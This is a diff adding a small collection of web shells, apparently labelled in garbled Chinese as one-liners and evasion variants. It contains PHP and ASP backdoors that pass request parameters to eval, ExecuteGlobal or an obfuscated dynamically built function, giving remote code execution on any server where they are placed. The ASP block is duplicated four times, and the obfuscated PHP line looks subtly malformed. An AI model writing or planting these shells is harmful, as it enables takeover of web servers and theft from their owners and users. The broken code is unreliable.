@@ -1,0 +1,34 @@
+#php重云
+<?php @eval($_POST['mima']);?>
+
+#asp重云
+<%eval request("mima")%>
+
+#asp窒姫重云
+<%
+estcc=request("x")
+If estcc<>"" THEN
+ExecuteGlobal(estcc):response.End
+End If
+%>
+<%
+estcc=request("x")
+If estcc<>"" THEN
+ExecuteGlobal(estcc):response.End
+End If
+%>
+<%
+estcc=request("x")
+If estcc<>"" THEN
+ExecuteGlobal(estcc):response.End
+End If
+%>
+<%
+estcc=request("x")
+If estcc<>"" THEN
+ExecuteGlobal(estcc):response.End
+End If
+%>
+
+#php窒姫重云
+<?php $a = chr(97),chr(115);$b = chr(115).chr(101);$c =$_GET['f'];$d = $a.$b.rand(1111,9999).$c;$e = substr($d,0,4).substr($d,8,10);$e($_POST['a']);?>
